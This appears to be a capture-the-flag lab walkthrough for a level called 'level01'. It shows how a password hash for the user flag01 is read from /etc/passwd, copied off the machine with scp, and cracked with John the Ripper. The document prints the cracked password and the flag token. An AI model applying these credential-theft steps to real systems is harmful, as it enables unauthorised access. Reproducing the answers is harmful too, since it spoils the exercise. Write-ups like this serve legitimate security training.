## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2001(level01) gid=2001(level01) groups=2001(level01),100(users)
```

This shows that we are operating as the user `level01`.

---

## Step 2: Searching for files

Next, we attempt to find any files owned by the user or `flag01` :

```bash
$ find / -user flag01 2> /dev/null
```

Unfortunately, this search did not yield any useful results.

---

## Step 3: Inspecting the `/etc/passwd` File

We then decide to examine the `/etc/passwd` file to gather more informations:

```bash
$ cat /etc/passwd
...
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
...
```

The entry for `flag01` contains a hashed password.

---

## Step 4: Cracking the Password

We transfer the `/etc/passwd` file to our local machine to attempt cracking the password:

```bash
$ scp -P 4242 level01@machine_ip:/etc/passwd .
$ john passwd
...
abcdefg          (flag01)
...
```

We successfully cracked the password, which is `abcdefg`.

---

## Step 5: Obtaining the Flag

Finally, we switch to the `flag01` user and retrieve the flag:

```bash
$ su flag01
Password:
abcdefg

$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

---

And there you have it, the token is `f2av5il02puano7naaf6adaaf`.
